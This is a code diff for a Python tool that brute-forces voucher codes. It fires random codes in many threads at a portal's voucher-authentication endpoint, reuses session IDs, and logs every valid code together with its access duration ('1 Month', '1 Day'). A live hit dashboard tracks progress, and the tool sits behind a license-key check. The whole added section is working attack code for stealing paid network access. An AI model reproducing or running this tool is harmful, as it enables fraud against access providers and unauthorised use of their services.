@@ -14,7 +14,7 @@ G = Fore.GREEN; W = Fore.WHITE; Y = Fore.YELLOW; R = Fore.RED; C = Fore.CYAN; RS
 # ===============================
 # CONFIGURATION
 # ===============================
-RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
+RAW_KEY_URL = "Https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
 if os.name == 'nt': DOWNLOAD_DIR = os.path.join(os.environ['USERPROFILE'], 'Downloads')
 else: DOWNLOAD_DIR = '/sdcard/Download'
 
@@ -187,3 +187,101 @@ def worker_thread():
     headers = {'Content-Type': 'application/json', 'Connection': 'keep-alive'}
     while not stop_event.is_set():
         try:
+            if not DETECTED_BASE_URL:
+                time.sleep(1); continue
+            try: slot = session_pool.get(timeout=2)
+            except Empty: continue
+            sid = slot.get('sessionId')
+            
+            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
+            if code in tried_codes: continue
+            tried_codes.add(code)
+            CURRENT_CODE = code
+            
+            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
+                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
+                                 headers=headers, timeout=6)
+            TOTAL_TRIED += 1
+            if TOTAL_TRIED % 100 == 0: save_progress()
+            
+            res_text = r.text.lower()
+            if "true" in res_text:
+                limit_label = "???"
+                try:
+                    res_data = r.json()
+                    limit = res_data.get('limit') or res_data.get('timeLimit')
+                    if not limit and 'data' in res_data:
+                        d = res_data['data']
+                        limit = d[0].get('timeLimit') if isinstance(d, list) else d.get('timeLimit')
+                    
+                    if limit:
+                        sec = int(limit)
+                        if sec == 2592000: limit_label = "1 Month"
+                        elif sec == 86400: limit_label = "1 Day"
+                        else: limit_label = f"{round(sec/3600, 1)} Hrs"
+                except: pass
+
+                with valid_lock:
+                    valid_hits_data.append({"code": code, "hrs": limit_label})
+                    TOTAL_HITS += 1
+                    save_locally(code, limit_label, sid)
+            
+            if r.status_code not in (401, 403):
+                slot['left'] -= 1
+                if slot['left'] > 0: session_pool.put(slot)
+        except: pass
+
+def save_locally(code, hrs, sid):
+    try:
+        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
+        with file_lock:
+            with open(SAVE_PATH, "a") as f: 
+                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {hrs} | SID: {sid}\n")
+    except: pass
+
+def live_dashboard():
+    while not stop_event.is_set():
+        Draw_logo()
+        elapsed = time.time() - START_TIME
+        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
+        now_time = datetime.now().strftime("%H:%M:%S")
+
+        print(W + "—" * 55)
+        print(f"| {W}STATUS : {G}ACTIVE         {W}SPEED  : {C}{speed:.1f} codes/s")
+        print(f"| {W}TIME   : {Y}{now_time}       {W}RUN    : {Fore.MAGENTA}{time.strftime('%H:%M:%S', time.gmtime(elapsed))}")
+        print(W + "—" * 55)
+        print(f"| {W}TOTAL TRIED : {W}{TOTAL_TRIED:,}")
+        print(f"| {W}FOUND HITS  : {G}{TOTAL_HITS}")
+        print(f"| {W}LAST TARGET : {Y}{CURRENT_CODE}")
+        print(W + "—" * 55)
+        
+        if valid_hits_data:
+            print(f"{G}[ RECENT HITS FOUND ]:")
+            for hit in valid_hits_data[-8:]:
+                color = R if "Month" in hit['hrs'] else G
+                print(f"  {color}✅ {hit['code']} {Y}({hit['hrs']})")
+        else:
+            print(f"{R}Scanning for vouchers...")
+
+        print(W + "—" * 55)
+        print(f"{Y}Saved to: {W}Downloads/hits.txt")
+        time.sleep(1.0)
+
+# ===============================
+# MAIN ENTRY
+# ===============================
+if __name__ == "__main__":
+    if verify(): # Key System စစ်မယ်
+        select_mode()
+        try:
+            threading.Thread(target=session_refiller, daemon=True).start()
+            threading.Thread(target=live_dashboard, daemon=True).start()
+            for _ in range(NUM_THREADS):
+                threading.Thread(target=worker_thread, daemon=True).start()
+            while True: time.sleep(1)
+        except KeyboardInterrupt:
+            stop_event.set()
+            save_progress()
+            print(f"\n\n{R}[!] Stopped. Data saved in Downloads/hits.txt{RS}")
+    else:
+        sys.exit()
